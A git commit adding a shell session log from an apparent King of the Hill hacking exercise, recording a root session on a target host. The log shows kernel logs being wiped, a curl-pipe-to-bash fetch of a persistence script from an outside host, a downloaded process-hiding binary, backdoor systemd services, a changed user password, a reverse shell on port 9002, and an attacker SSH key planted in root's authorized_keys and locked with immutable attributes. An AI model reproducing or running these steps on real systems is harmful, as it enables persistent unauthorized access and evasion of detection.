9f1dda6c072323cfc997a4b5c310ee1c40a0243b
Noah Schon <75913553+ns989@users.noreply.github.com>
2023-11-18 10:05:10 -0500

    Add files via upload

---
+++ koth-shell-session-cc89a68dfeb2cec84ead91db84098e9e.sh
@@ -0,0 +1,199 @@
+echo "" > kern.log
+# ls dmesg*
+dmesg
+# echo "" > dmesg
+# curl -sL http://10.11.55.164/persistence.sh | bash
+--2023-11-05 13:13:52--  http://10.11.55.164/c
+Connecting to 10.11.55.164:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 762816 (745K) [application/octet-stream]
+Saving to: ...c...
+
+     0K .......... .......... .......... .......... ..........  6%  130K 5s
+    50K .......... .......... .......... .......... .......... 13%  260K 4s
+   100K .......... .......... .......... .......... .......... 20% 7.95M 2s
+   150K .......... .......... .......... .......... .......... 26%  267K 2s
+   200K .......... .......... .......... .......... .......... 33% 7.43M 2s
+   250K .......... .......... .......... .......... .......... 40% 7.44M 1s
+   300K .......... .......... .......... .......... .......... 46% 9.33M 1s
+   350K .......... .......... .......... .......... .......... 53%  284K 1s
+   400K .......... .......... .......... .......... .......... 60% 6.58M 1s
+   450K .......... .......... .......... .......... .......... 67% 8.60M 0s
+   500K .......... .......... .......... .......... .......... 73% 5.12M 0s
+   550K .......... .......... .......... .......... .......... 80% 28.4M 0s
+   600K .......... .......... .......... .......... .......... 87% 9.51M 0s
+   650K .......... .......... .......... .......... .......... 93% 5.15M 0s
+   700K .......... .......... .......... .......... ....      100%  362M=1.0s
+
+2023-11-05 13:13:54 (742 KB/s) - ...c... saved [762816/762816]
+
+proccess hid finish hiding the rest
+--2023-11-05 13:13:54--  http://10.11.55.164/kothh.service
+Connecting to 10.11.55.164:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 235 [application/octet-stream]
+Saving to: ...kothh.service...
+
+     0K                                                       100% 38.6M=0s
+
+2023-11-05 13:13:54 (38.6 MB/s) - ...kothh.service... saved [235/235]
+
+Created symlink from /etc/systemd/system/multi-user.target.wants/kothh.service to /etc/systemd/system/kothh.service.
+--2023-11-05 13:13:55--  http://10.11.55.164/https.service
+Connecting to 10.11.55.164:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 235 [application/octet-stream]
+Saving to: ...https.service...
+
+     0K                                                       100%  156K=0.001s
+
+2023-11-05 13:13:56 (156 KB/s) - ...https.service... saved [235/235]
+
+Created symlink from /etc/systemd/system/multi-user.target.wants/https.service to /etc/systemd/system/https.service.
+systemd installed...
+passwd: user 'systemd' does not exist
+set passwd for steve...
+rev on 9002...
+Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully
+--2023-11-05 13:13:58--  http://10.11.55.164/id_rsa.pub
+Connecting to 10.11.55.164:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 563 [application/vnd.exstream-package]
+Saving to: ...authorized_keys...
+
+     0K                                                       100%  113M=0s
+
+2023-11-05 13:13:58 (113 MB/s) - ...authorized_keys... saved [563/563]
+
+Downloading nyancat troll...
+--2023-11-05 13:13:58--  http://10.11.55.164/nyan
+Connecting to 10.11.55.164:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 814528 (795K) [application/octet-stream]
+Saving to: ...nyan...
+
+     0K .......... .......... .......... .......... ..........  6%  129K 6s
+    50K .......... .......... .......... .......... .......... 12%  248K 4s
+   100K .......... .......... .......... .......... .......... 18% 3.13M 3s
+   150K .......... .......... .......... .......... .......... 25%  266K 2s
+   200K .......... .......... .......... .......... .......... 31% 6.08M 2s
+   250K .......... .......... .......... .......... .......... 37% 7.64M 1s
+   300K .......... .......... .......... .......... .......... 44% 8.35M 1s
+   350K .......... .......... .......... .......... .......... 50%  284K 1s
+   400K .......... .......... .......... .......... .......... 56% 5.06M 1s
+   450K .......... .......... .......... .......... .......... 62% 13.0M 1s
+   500K .......... .......... .......... .......... .......... 69% 4.34M 0s
+   550K .......... .......... .......... .......... .......... 75%  298K 0s
+   600K .......... .......... .......... .......... .......... 81% 5.01M 0s
+   650K .......... .......... .......... .......... .......... 88% 8.00M 0s
+   700K .......... .......... .......... .......... .......... 94% 9.56M 0s
+   750K .......... .......... .......... .......... .....     100%  264K=1.4s
+
+2023-11-05 13:14:00 (579 KB/s) - ...nyan... saved [814528/814528]
+
+done..
+--2023-11-05 13:14:00--  http://10.11.55.164/pspy64
+Connecting to 10.11.55.164:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: .../etc/pspy64...
+
+     0K .......... .......... .......... .......... ..........  1%  128K 23s
+    50K .......... .......... .......... .......... ..........  3%  265K 17s
+   100K .......... .......... .......... .......... ..........  4% 3.99M 11s
+   150K .......... .......... .......... .......... ..........  6%  252K 11s
+   200K .......... .......... .......... .......... ..........  8% 2.13M 9s
+   250K .......... .......... .......... .......... ..........  9%  379M 7s
+   300K .......... .......... .......... .......... .......... 11%  353M 6s
+   350K .......... .......... .......... .......... .......... 13%  296K 6s
+   400K .......... .......... .......... .......... .......... 14% 1.65M 6s
+   450K .......... .......... .......... .......... .......... 16% 8.43M 5s
+   500K .......... .......... .......... .......... .......... 18% 1.11M 5s
+   550K .......... .......... .......... .......... .......... 19%  381M 4s
+   600K .......... .......... .......... .......... .......... 21%  363M 4s
+   650K .......... .......... .......... .......... .......... 23%  317M 4s
+   700K .......... .......... .......... .......... .......... 24%  412M 3s
+   750K .......... .......... .......... .......... .......... 26%  436K 3s
+   800K .......... .......... .......... .......... .......... 28% 3.04M 3s
+   850K .......... .......... .......... .......... .......... 29% 4.60M 3s
+   900K .......... .......... .......... .......... .......... 31% 3.66M 3s
+   950K .......... .......... .......... .......... .......... 32%  331M 2s
+  1000K .......... .......... .......... .......... .......... 34% 1.37M 2s
+  1050K .......... .......... .......... .......... .......... 36% 7.28M 2s
+  1100K .......... .......... .......... .......... .......... 37% 9.16M 2s
+  1150K .......... .......... .......... .......... .......... 39% 9.11M 2s
+  1200K .......... .......... .......... .......... .......... 41% 9.17M 2s
+  1250K .......... .......... .......... .......... .......... 42% 3.40M 2s
+  1300K .......... .......... .......... .......... .......... 44%  352M 2s
+  1350K .......... .......... .......... .......... .......... 46%  248M 2s
+  1400K .......... .......... .......... .......... .......... 47%  617K 1s
+  1450K .......... .......... .......... .......... .......... 49% 2.55M 1s
+  1500K .......... .......... .......... .......... .......... 51% 7.17M 1s
+  1550K .......... .......... .......... .......... .......... 52% 3.77M 1s
+  1600K .......... .......... .......... .......... .......... 54% 4.40M 1s
+  1650K .......... .......... .......... .......... .......... 56% 1.93M 1s
+  1700K .......... .......... .......... .......... .......... 57% 7.69M 1s
+  1750K .......... .......... .......... .......... .......... 59% 10.0M 1s
+  1800K .......... .......... .......... .......... .......... 61% 9.03M 1s
+  1850K .......... .......... .......... .......... .......... 62% 11.0M 1s
+  1900K .......... .......... .......... .......... .......... 64% 3.10M 1s
+  1950K .......... .......... .......... .......... .......... 65% 4.70M 1s
+  2000K .......... .......... .......... .......... .......... 67%  308M 1s
+  2050K .......... .......... .......... .......... .......... 69%  757K 1s
+  2100K .......... .......... .......... .......... .......... 70% 5.22M 1s
+  2150K .......... .......... .......... .......... .......... 72% 2.66M 1s
+  2200K .......... .......... .......... .......... .......... 74% 10.0M 1s
+  2250K .......... .......... .......... .......... .......... 75% 2.31M 1s
+  2300K .......... .......... .......... .......... .......... 77% 11.0M 0s
+  2350K .......... .......... .......... .......... .......... 79% 2.17M 0s
+  2400K .......... .......... .......... .......... .......... 80% 7.31M 0s
+  2450K .......... .......... .......... .......... .......... 82% 9.49M 0s
+  2500K .......... .......... .......... .......... .......... 84% 12.6M 0s
+  2550K .......... .......... .......... .......... .......... 85% 9.40M 0s
+  2600K .......... .......... .......... .......... .......... 87% 3.40M 0s
+  2650K .......... .......... .......... .......... .......... 89% 3.67M 0s
+  2700K .......... .......... .......... .......... .......... 90% 11.5M 0s
+  2750K .......... .......... .......... .......... .......... 92%  608K 0s
+  2800K .......... .......... .......... .......... .......... 93%  331M 0s
+  2850K .......... .......... .......... .......... .......... 95% 1.23M 0s
+  2900K .......... .......... .......... .......... .......... 97%  320M 0s
+  2950K .......... .......... .......... .......... .......... 98%  409M 0s
+  3000K .......... .......... .......... ..                   100%  352M=1.8s
+
+2023-11-05 13:14:02 (1.63 MB/s) - .../etc/pspy64... saved [3104768/3104768]
+
+# cd /root/.ssh
+# ls -la
+total 12
+drwx------ 2 root root 4096 Nov  5 13:14 .
+drwx------ 8 root root 4096 Nov  5 13:13 ..
+-rw------- 1 root root  563 Jul 23 16:26 authorized_keys
+# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKgjI4hhS17zW4phwgxz0jMUzH8aC/lXf0Hm80loA7L8mfvKrok7eNKvBX1LjR8TAGPQKyr1sxpJvlO4YnMTPUGJiXueZThmUxnFtdtv6KNVYtWqW+Wj/LuR3E3xNkOkGmujYOepIdaguWi4IKpZrO2etmfUqrkB/UfpDSLjWlFb+vqDUfltQLHGqEWRNhkdn+Gy5WOtc/VTTfPf2AgrbCK0WF2wHtTVdAJMjQcGBFToOdu1HtzFl7y780xOAvkLx7WnWAaFdVWGTOz525fetWETJ17YbOHN/IXc13VdQUSiVtP2mU5QrJvu6hurF/8OJAwQw4r4RcLarcSGchxFkaFLGIyUpqEwBKAxXlqUrfdeF6pwwQ6MD7wKIMfJ0ZbwkHI4WOQ564JOZoYtoZVTboip+pcNupUyAkrtKDbBR5pioN/G/Db0hVbYOSOVhWdkH+13sLsjc3FKc1PqZ/w+6Z2nCdvcnUWLwWTBXYP4Sg2ZkZauNk+i7OS5AuERsgA50= kali@kali" > auth*
+# ls -la
+total 16
+drwx------ 2 root root 4096 Nov  5 13:14 .
+drwx------ 8 root root 4096 Nov  5 13:13 ..
+-rw-r--r-- 1 root root  563 Nov  5 13:14 auth*
+-rw------- 1 root root  563 Jul 23 16:26 authorized_keys
+# rm auth*
+# # echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKgjI4hhS17zW4phwgxz0jMUzH8aC/lXf0Hm80loA7L8mfvKrok7eNKvBX1LjR8TAGPQKyr1sxpJvlO4YnMTPUGJiXueZThmUxnFtdtv6KNVYtWqW+Wj/LuR3E3xNkOkGmujYOepIdaguWi4IKpZrO2etmfUqrkB/UfpDSLjWlFb+vqDUfltQLHGqEWRNhkdn+Gy5WOtc/VTTfPf2AgrbCK0WF2wHtTVdAJMjQcGBFToOdu1HtzFl7y780xOAvkLx7WnWAaFdVWGTOz525fetWETJ17YbOHN/IXc13VdQUSiVtP2mU5QrJvu6hurF/8OJAwQw4r4RcLarcSGchxFkaFLGIyUpqEwBKAxXlqUrfdeF6pwwQ6MD7wKIMfJ0ZbwkHI4WOQ564JOZoYtoZVTboip+pcNupUyAkrtKDbBR5pioN/G/Db0hVbYOSOVhWdkH+13sLsjc3FKc1PqZ/w+6Z2nCdvcnUWLwWTBXYP4Sg2ZkZauNk+i7OS5AuERsgA50= kali@kali" > authorized_keys
+# c +ia au*
+ERROR: Unable to get flags on au*, skipping
+# ls -la
+total 8
+drwx------ 2 root root 4096 Nov  5 13:14 .
+drwx------ 8 root root 4096 Nov  5 13:13 ..
+# pwd
+/root/.ssh
+# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKgjI4hhS17zW4phwgxz0jMUzH8aC/lXf0Hm80loA7L8mfvKrok7eNKvBX1LjR8TAGPQKyr1sxpJvlO4YnMTPUGJiXueZThmUxnFtdtv6KNVYtWqW+Wj/LuR3E3xNkOkGmujYOepIdaguWi4IKpZrO2etmfUqrkB/UfpDSLjWlFb+vqDUfltQLHGqEWRNhkdn+Gy5WOtc/VTTfPf2AgrbCK0WF2wHtTVdAJMjQcGBFToOdu1HtzFl7y780xOAvkLx7WnWAaFdVWGTOz525fetWETJ17YbOHN/IXc13VdQUSiVtP2mU5QrJvu6hurF/8OJAwQw4r4RcLarcSGchxFkaFLGIyUpqEwBKAxXlqUrfdeF6pwwQ6MD7wKIMfJ0ZbwkHI4WOQ564JOZoYtoZVTboip+pcNupUyAkrtKDbBR5pioN/G/Db0hVbYOSOVhWdkH+13sLsjc3FKc1PqZ/w+6Z2nCdvcnUWLwWTBXYP4Sg2ZkZauNk+i7OS5AuERsgA50= kali@kali" > authorized_keys
+# pwd
+/root/.ssh
+# c +ia au*
+cur attrs: 0x00080000, mask: 0x00000030
+new attrs: 0x00080030
+# ls -la
+total 12
+drwx------ 2 root root 4096 Nov  5 13:14 .
+drwx------ 8 root root 4096 Nov  5 13:13 ..
+-rw-r--r-- 1 root root  563 Nov  5 13:14 authorized_keys
+# exit
